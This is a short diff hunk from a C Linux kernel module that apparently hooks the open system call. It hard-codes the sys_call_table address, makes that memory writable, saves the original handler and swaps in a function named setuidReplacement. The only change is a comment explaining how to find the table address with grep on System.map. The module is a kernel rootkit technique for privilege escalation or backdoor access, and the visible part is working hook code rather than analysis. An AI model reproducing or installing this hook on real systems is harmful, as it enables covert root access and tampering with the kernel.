@@ -24,8 +24,8 @@ int SetPageAttributes(long unsigned int _addr)
 
 int init_module()
 {
-    // SysCallTable address in System.map
-    SysCallTable = (void*)0xc061e4e0;
+    SysCallTable = (void*)0xc061e4e0;  //Can be found using: grep "sys_call_table" /boot/System.map-`uname -r` I will
+                                       //be adding a function that dynamically/automatically finds this memory location.
     original_call = SysCallTable[__NR_open];
     SetPageAttributes(SysCallTable);
     SysCallTable[__NR_open] = setuidReplacement;
